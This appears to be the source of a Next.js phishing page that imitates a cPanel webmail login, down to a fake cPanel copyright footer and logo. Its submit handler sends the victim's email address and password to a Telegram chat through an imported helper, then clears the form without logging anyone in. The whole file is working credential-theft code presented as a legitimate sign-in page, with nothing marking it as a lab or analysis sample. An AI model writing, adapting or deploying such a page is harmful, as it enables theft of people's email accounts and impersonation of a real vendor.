// app/page.tsx

'use client';

import { useState } from 'react';
import { sendTelegramMessage } from "../utils/telegram";
import Image from 'next/image';

export default function Home() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    setLoading(true);

    const message = `
🔐 New Webmail Login

📧 Email: ${email}
🔑 Password: ${password}
    `;

    try {
      await sendTelegramMessage(message);
    } catch (error) {
      console.error("Failed:", error);
    } finally {
      setLoading(false);
    }

    setEmail('');
    setPassword('');
  };

  return (
    <main className="flex min-h-screen flex-col items-center justify-between p-4 bg-gray-50">
      <div className="w-full max-w-sm bg-white p-8 rounded-lg shadow-lg mt-10">
        <div className="flex justify-center mb-6">
          {/* Use either base64 img or /public/webmail-logo.svg */}
          <Image src="/webmail.png" alt="Webmail Logo" width={200} height={60} />
        </div>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label htmlFor="email" className="block text-sm font-semibold mb-1">Email Address</label>
            <input
              type="email"
              id="email"
              placeholder="Enter your email address."
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              className="w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
          </div>
          <div>
            <label htmlFor="password" className="block text-sm font-semibold mb-1">Password</label>
            <input
              type="password"
              id="password"
              placeholder="Enter your email password."
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              className="w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
          </div>
          <button
            type="submit"
            disabled={loading}
            className={`w-full bg-blue-500 text-white py-2 rounded-md hover:bg-blue-600 transition ${loading ? 'opacity-50 cursor-not-allowed' : ''}`}
          >
            {loading ? 'Logging in...' : 'Log in'}
          </button>
        </form>
        <div className="mt-4 text-center">
          <a href="#" className="text-sm text-blue-500 hover:underline">Reset Password</a>
        </div>
      </div>

      <div className="mt-8 text-center">
        <p className="text-gray-700 font-medium mb-3">Need help? We&apos;re always here for you.</p>
        <button
          className="px-5 py-2 bg-gradient-to-r from-green-400 to-green-600 text-white rounded-md hover:opacity-90 transition"
          onClick={() => alert('Connecting to a live person...')}
        >
          Chat with a Live Person
        </button>
      </div>

      {/* Footer Section */}
      <footer className="w-full mt-10 border-t pt-4 text-center">
        <div className="flex flex-wrap justify-center gap-4 mb-4 text-sm text-gray-700">
          <span>English</span>
          <span>العربية</span>
          <span>български</span>
          <span>čeština</span>
          <span>dansk</span>
          <span>Deutsch</span>
          <span>Ελληνικά</span>
          <span>español</span>
          <span>...</span>
        </div>
        <div className="flex flex-col items-center mb-4">
          <Image src="/cp-logo.svg" alt="cPanel Logo" width={40} height={40} />
          <p className="text-xs text-gray-500 mt-2">&copy; 2025 cPanel, Inc.</p>
        </div>
      </footer>
    </main>
  );
}
